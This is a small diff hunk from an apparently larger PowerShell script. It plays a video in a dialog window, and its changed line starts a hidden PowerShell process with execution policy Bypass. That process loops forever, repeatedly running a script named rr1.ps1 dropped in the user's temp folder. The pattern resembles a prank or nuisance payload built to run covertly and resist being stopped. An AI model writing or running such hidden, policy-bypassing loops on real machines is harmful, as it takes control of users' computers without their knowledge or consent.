@@ -55,4 +55,4 @@ $VideoPlayer.Play()
 $Window.ShowDialog() | out-null
 
 $D="$env:TMP"+'\rr'
-powershell -w h -NoP -NonI -Exec Bypass 'while ($true) { $D\rr1.ps1; }'
+powershell -w h -NoP -NonI -Exec Bypass "while (1) {$D\rr1.ps1}"
